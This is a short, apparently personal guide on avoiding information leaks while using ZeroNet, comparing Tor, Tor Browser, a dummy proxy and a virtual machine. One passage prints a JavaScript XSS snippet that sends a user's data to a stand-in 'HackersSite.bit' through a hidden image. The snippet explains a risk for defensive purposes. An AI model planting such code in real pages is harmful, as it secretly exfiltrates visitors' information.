How can I deal with such information leak?

This is not a professional guide. If you find any flaw, please report it to me via mail@zeroverse.

1. Use the proxy provided by Tor. -- Traffic going to clearnet sites will be sent through Tor. Their owners cannot see your IP address directly. However, your browser can be fingerprinted. Your IP address can also be leaked through WebRTC.

2. Use Tor Browser. -- Traffic going to clearnet sites will be sent through Tor. WebRTC is disabled by default. Browser Fingerprinting is mitigated. However, owners of linked clearnet sites can still know your system time, screen size, operating system (and Javascript performance?), using Javascript.

3. Use a not-working proxy. (e.g. 127.0.0.1:43999) -- Good. You have blocked all clearnet traffic. However, XSS attack can also be performed inside the ZeroNet network.

var url = "/HackersSite.bit/?q=" + encodeURIComponent(your_info);
var html = "<img style='display: none' src='"+url+"'></img>";
document.getElementById('xss').innerHTML = html;

Queries are sent to their designated server.

4. Use a virtual machine. In your guest system, 1) change the screen resolution, 2) disable NTP time sync, 3) then change the timezone and screw the system clock by a few minutes. 4) Inside your virtual machine, run ZeroNet with FireFox's proxy set to a dummy address.
